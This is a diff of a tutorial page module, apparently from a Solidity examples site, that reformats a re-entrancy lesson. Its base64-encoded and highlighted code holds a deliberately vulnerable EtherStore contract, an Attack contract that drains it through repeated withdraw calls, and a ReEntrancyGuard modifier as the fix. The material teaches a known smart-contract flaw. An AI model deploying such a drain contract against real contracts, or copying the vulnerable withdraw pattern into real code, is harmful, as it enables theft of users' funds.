@@ -3,17 +3,21 @@ export const version = "0.8.20"
 export const title = "Re-Entrancy"
 export const description = "An example of re-entrancy attack in Solidity"
 
-export const keywords = ["hack", "security", "re-entrancy"]
+export const keywords = [
+    "hack",
+    "security",
+    "re-entrancy",
+]
 
 export const codes = [
-  {
-    fileName: "ReEntrancy.sol",
-    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCi8qCkV0aGVyU3RvcmUgaXMgYSBjb250cmFjdCB3aGVyZSB5b3UgY2FuIGRlcG9zaXQgYW5kIHdpdGhkcmF3IEVUSC4KVGhpcyBjb250cmFjdCBpcyB2dWxuZXJhYmxlIHRvIHJlLWVudHJhbmN5IGF0dGFjay4KTGV0J3Mgc2VlIHdoeS4KCjEuIERlcGxveSBFdGhlclN0b3JlCjIuIERlcG9zaXQgMSBFdGhlciBlYWNoIGZyb20gQWNjb3VudCAxIChBbGljZSkgYW5kIEFjY291bnQgMiAoQm9iKSBpbnRvIEV0aGVyU3RvcmUKMy4gRGVwbG95IEF0dGFjayB3aXRoIGFkZHJlc3Mgb2YgRXRoZXJTdG9yZQo0LiBDYWxsIEF0dGFjay5hdHRhY2sgc2VuZGluZyAxIGV0aGVyICh1c2luZyBBY2NvdW50IDMgKEV2ZSkpLgogICBZb3Ugd2lsbCBnZXQgMyBFdGhlcnMgYmFjayAoMiBFdGhlciBzdG9sZW4gZnJvbSBBbGljZSBhbmQgQm9iLAogICBwbHVzIDEgRXRoZXIgc2VudCBmcm9tIHRoaXMgY29udHJhY3QpLgoKV2hhdCBoYXBwZW5lZD8KQXR0YWNrIHdhcyBhYmxlIHRvIGNhbGwgRXRoZXJTdG9yZS53aXRoZHJhdyBtdWx0aXBsZSB0aW1lcyBiZWZvcmUKRXRoZXJTdG9yZS53aXRoZHJhdyBmaW5pc2hlZCBleGVjdXRpbmcuCgpIZXJlIGlzIGhvdyB0aGUgZnVuY3Rpb25zIHdlcmUgY2FsbGVkCi0gQXR0YWNrLmF0dGFjawotIEV0aGVyU3RvcmUuZGVwb3NpdAotIEV0aGVyU3RvcmUud2l0aGRyYXcKLSBBdHRhY2sgZmFsbGJhY2sgKHJlY2VpdmVzIDEgRXRoZXIpCi0gRXRoZXJTdG9yZS53aXRoZHJhdwotIEF0dGFjay5mYWxsYmFjayAocmVjZWl2ZXMgMSBFdGhlcikKLSBFdGhlclN0b3JlLndpdGhkcmF3Ci0gQXR0YWNrIGZhbGxiYWNrIChyZWNlaXZlcyAxIEV0aGVyKQoqLwoKY29udHJhY3QgRXRoZXJTdG9yZSB7CiAgICBtYXBwaW5nKGFkZHJlc3MgPT4gdWludCkgcHVibGljIGJhbGFuY2VzOwoKICAgIGZ1bmN0aW9uIGRlcG9zaXQoKSBwdWJsaWMgcGF5YWJsZSB7CiAgICAgICAgYmFsYW5jZXNbbXNnLnNlbmRlcl0gKz0gbXNnLnZhbHVlOwogICAgfQoKICAgIGZ1bmN0aW9uIHdpdGhkcmF3KCkgcHVibGljIHsKICAgICAgICB1aW50IGJhbCA9IGJhbGFuY2VzW21zZy5zZW5kZXJdOwogICAgICAgIHJlcXVpcmUoYmFsID4gMCk7CgogICAgICAgIChib29sIHNlbnQsICkgPSBtc2cuc2VuZGVyLmNhbGx7dmFsdWU6IGJhbH0oIiIpOwogICAgICAgIHJlcXVpcmUoc2VudCwgIkZhaWxlZCB0byBzZW5kIEV0aGVyIik7CgogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdID0gMDsKICAgIH0KCiAgICAvLyBIZWxwZXIgZnVuY3Rpb24gdG8gY2hlY2sgdGhlIGJhbGFuY2Ugb2YgdGhpcyBjb250cmFjdAogICAgZnVuY3Rpb24gZ2V0QmFsYW5jZSgpIHB1YmxpYyB2aWV3IHJldHVybnMgKHVpbnQpIHsKICAgICAgICByZXR1cm4gYWRkcmVzcyh0aGlzKS5iYWxhbmNlOwogICAgfQp9Cgpjb250cmFjdCBBdHRhY2sgewogICAgRXRoZXJTdG9yZSBwdWJsaWMgZXRoZXJTdG9yZTsKCiAgICBjb25zdHJ1Y3RvcihhZGRyZXNzIF9ldGhlclN0b3JlQWRkcmVzcykgewogICAgICAgIGV0aGVyU3RvcmUgPSBFdGhlclN0b3JlKF9ldGhlclN0b3JlQWRkcmVzcyk7CiAgICB9CgogICAgLy8gRmFsbGJhY2sgaXMgY2FsbGVkIHdoZW4gRXRoZXJTdG9yZSBzZW5kcyBFdGhlciB0byB0aGlzIGNvbnRyYWN0LgogICAgZmFsbGJhY2soKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgICAgICBpZiAoYWRkcmVzcyhldGhlclN0b3JlKS5iYWxhbmNlID49IDEgZXRoZXIpIHsKICAgICAgICAgICAgZXRoZXJTdG9yZS53aXRoZHJhdygpOwogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBhdHRhY2soKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgICAgICByZXF1aXJlKG1zZy52YWx1ZSA+PSAxIGV0aGVyKTsKICAgICAgICBldGhlclN0b3JlLmRlcG9zaXR7dmFsdWU6IDEgZXRoZXJ9KCk7CiAgICAgICAgZXRoZXJTdG9yZS53aXRoZHJhdygpOwogICAgfQoKICAgIC8vIEhlbHBlciBmdW5jdGlvbiB0byBjaGVjayB0aGUgYmFsYW5jZSBvZiB0aGlzIGNvbnRyYWN0CiAgICBmdW5jdGlvbiBnZXRCYWxhbmNlKCkgcHVibGljIHZpZXcgcmV0dXJucyAodWludCkgewogICAgICAgIHJldHVybiBhZGRyZXNzKHRoaXMpLmJhbGFuY2U7CiAgICB9Cn0K",
-  },
-  {
-    fileName: "ReEntrancyGuard.sol",
-    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCmNvbnRyYWN0IFJlRW50cmFuY3lHdWFyZCB7CiAgICBib29sIGludGVybmFsIGxvY2tlZDsKCiAgICBtb2RpZmllciBub1JlZW50cmFudCgpIHsKICAgICAgICByZXF1aXJlKCFsb2NrZWQsICJObyByZS1lbnRyYW5jeSIpOwogICAgICAgIGxvY2tlZCA9IHRydWU7CiAgICAgICAgXzsKICAgICAgICBsb2NrZWQgPSBmYWxzZTsKICAgIH0KfQo=",
-  },
+    {
+        fileName: "ReEntrancy.sol",
+        code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCi8qCkV0aGVyU3RvcmUgaXMgYSBjb250cmFjdCB3aGVyZSB5b3UgY2FuIGRlcG9zaXQgYW5kIHdpdGhkcmF3IEVUSC4KVGhpcyBjb250cmFjdCBpcyB2dWxuZXJhYmxlIHRvIHJlLWVudHJhbmN5IGF0dGFjay4KTGV0J3Mgc2VlIHdoeS4KCjEuIERlcGxveSBFdGhlclN0b3JlCjIuIERlcG9zaXQgMSBFdGhlciBlYWNoIGZyb20gQWNjb3VudCAxIChBbGljZSkgYW5kIEFjY291bnQgMiAoQm9iKSBpbnRvIEV0aGVyU3RvcmUKMy4gRGVwbG95IEF0dGFjayB3aXRoIGFkZHJlc3Mgb2YgRXRoZXJTdG9yZQo0LiBDYWxsIEF0dGFjay5hdHRhY2sgc2VuZGluZyAxIGV0aGVyICh1c2luZyBBY2NvdW50IDMgKEV2ZSkpLgogICBZb3Ugd2lsbCBnZXQgMyBFdGhlcnMgYmFjayAoMiBFdGhlciBzdG9sZW4gZnJvbSBBbGljZSBhbmQgQm9iLAogICBwbHVzIDEgRXRoZXIgc2VudCBmcm9tIHRoaXMgY29udHJhY3QpLgoKV2hhdCBoYXBwZW5lZD8KQXR0YWNrIHdhcyBhYmxlIHRvIGNhbGwgRXRoZXJTdG9yZS53aXRoZHJhdyBtdWx0aXBsZSB0aW1lcyBiZWZvcmUKRXRoZXJTdG9yZS53aXRoZHJhdyBmaW5pc2hlZCBleGVjdXRpbmcuCgpIZXJlIGlzIGhvdyB0aGUgZnVuY3Rpb25zIHdlcmUgY2FsbGVkCi0gQXR0YWNrLmF0dGFjawotIEV0aGVyU3RvcmUuZGVwb3NpdAotIEV0aGVyU3RvcmUud2l0aGRyYXcKLSBBdHRhY2sgZmFsbGJhY2sgKHJlY2VpdmVzIDEgRXRoZXIpCi0gRXRoZXJTdG9yZS53aXRoZHJhdwotIEF0dGFjay5mYWxsYmFjayAocmVjZWl2ZXMgMSBFdGhlcikKLSBFdGhlclN0b3JlLndpdGhkcmF3Ci0gQXR0YWNrIGZhbGxiYWNrIChyZWNlaXZlcyAxIEV0aGVyKQoqLwoKY29udHJhY3QgRXRoZXJTdG9yZSB7CiAgICBtYXBwaW5nKGFkZHJlc3MgPT4gdWludCkgcHVibGljIGJhbGFuY2VzOwoKICAgIGZ1bmN0aW9uIGRlcG9zaXQoKSBwdWJsaWMgcGF5YWJsZSB7CiAgICAgICAgYmFsYW5jZXNbbXNnLnNlbmRlcl0gKz0gbXNnLnZhbHVlOwogICAgfQoKICAgIGZ1bmN0aW9uIHdpdGhkcmF3KCkgcHVibGljIHsKICAgICAgICB1aW50IGJhbCA9IGJhbGFuY2VzW21zZy5zZW5kZXJdOwogICAgICAgIHJlcXVpcmUoYmFsID4gMCk7CgogICAgICAgIChib29sIHNlbnQsICkgPSBtc2cuc2VuZGVyLmNhbGx7dmFsdWU6IGJhbH0oIiIpOwogICAgICAgIHJlcXVpcmUoc2VudCwgIkZhaWxlZCB0byBzZW5kIEV0aGVyIik7CgogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdID0gMDsKICAgIH0KCiAgICAvLyBIZWxwZXIgZnVuY3Rpb24gdG8gY2hlY2sgdGhlIGJhbGFuY2Ugb2YgdGhpcyBjb250cmFjdAogICAgZnVuY3Rpb24gZ2V0QmFsYW5jZSgpIHB1YmxpYyB2aWV3IHJldHVybnMgKHVpbnQpIHsKICAgICAgICByZXR1cm4gYWRkcmVzcyh0aGlzKS5iYWxhbmNlOwogICAgfQp9Cgpjb250cmFjdCBBdHRhY2sgewogICAgRXRoZXJTdG9yZSBwdWJsaWMgZXRoZXJTdG9yZTsKICAgIHVpbnQyNTYgY29uc3RhbnQgcHVibGljIEFNT1VOVCA9IDEgZXRoZXI7CgogICAgY29uc3RydWN0b3IoYWRkcmVzcyBfZXRoZXJTdG9yZUFkZHJlc3MpIHsKICAgICAgICBldGhlclN0b3JlID0gRXRoZXJTdG9yZShfZXRoZXJTdG9yZUFkZHJlc3MpOwogICAgfQoKICAgIC8vIEZhbGxiYWNrIGlzIGNhbGxlZCB3aGVuIEV0aGVyU3RvcmUgc2VuZHMgRXRoZXIgdG8gdGhpcyBjb250cmFjdC4KICAgIGZhbGxiYWNrKCkgZXh0ZXJuYWwgcGF5YWJsZSB7CiAgICAgICAgaWYgKGFkZHJlc3MoZXRoZXJTdG9yZSkuYmFsYW5jZSA+PSBBTU9VTlQpIHsKICAgICAgICAgICAgZXRoZXJTdG9yZS53aXRoZHJhdygpOwogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBhdHRhY2soKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgICAgICByZXF1aXJlKG1zZy52YWx1ZSA+PSBBTU9VTlQpOwogICAgICAgIGV0aGVyU3RvcmUuZGVwb3NpdHt2YWx1ZTogQU1PVU5UfSgpOwogICAgICAgIGV0aGVyU3RvcmUud2l0aGRyYXcoKTsKICAgIH0KCiAgICAvLyBIZWxwZXIgZnVuY3Rpb24gdG8gY2hlY2sgdGhlIGJhbGFuY2Ugb2YgdGhpcyBjb250cmFjdAogICAgZnVuY3Rpb24gZ2V0QmFsYW5jZSgpIHB1YmxpYyB2aWV3IHJldHVybnMgKHVpbnQpIHsKICAgICAgICByZXR1cm4gYWRkcmVzcyh0aGlzKS5iYWxhbmNlOwogICAgfQp9Cg==",
+    },
+    {
+        fileName: "ReEntrancyGuard.sol",
+        code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCmNvbnRyYWN0IFJlRW50cmFuY3lHdWFyZCB7CiAgICBib29sIGludGVybmFsIGxvY2tlZDsKCiAgICBtb2RpZmllciBub1JlZW50cmFudCgpIHsKICAgICAgICByZXF1aXJlKCFsb2NrZWQsICJObyByZS1lbnRyYW5jeSIpOwogICAgICAgIGxvY2tlZCA9IHRydWU7CiAgICAgICAgXzsKICAgICAgICBsb2NrZWQgPSBmYWxzZTsKICAgIH0KfQo=",
+    },
 ]
 
 const html = `<h3>Vulnerability</h3>
@@ -74,6 +78,7 @@ Here is how the functions were called
 
 <span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
     EtherStore <span class="hljs-keyword">public</span> etherStore;
+    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">constant</span> <span class="hljs-keyword">public</span> AMOUNT <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>;
 
     <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _etherStoreAddress</span>) </span>{
         etherStore <span class="hljs-operator">=</span> EtherStore(_etherStoreAddress);
@@ -81,14 +86,14 @@ Here is how the functions were called
 
     <span class="hljs-comment">// Fallback is called when EtherStore sends Ether to this contract.</span>
     <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
-        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(etherStore).<span class="hljs-built_in">balance</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(etherStore).<span class="hljs-built_in">balance</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> AMOUNT) {
             etherStore.withdraw();
         }
     }
 
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
-        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
-        etherStore.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
+        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> AMOUNT);
+        etherStore.deposit{<span class="hljs-built_in">value</span>: AMOUNT}();
         etherStore.withdraw();
     }
 
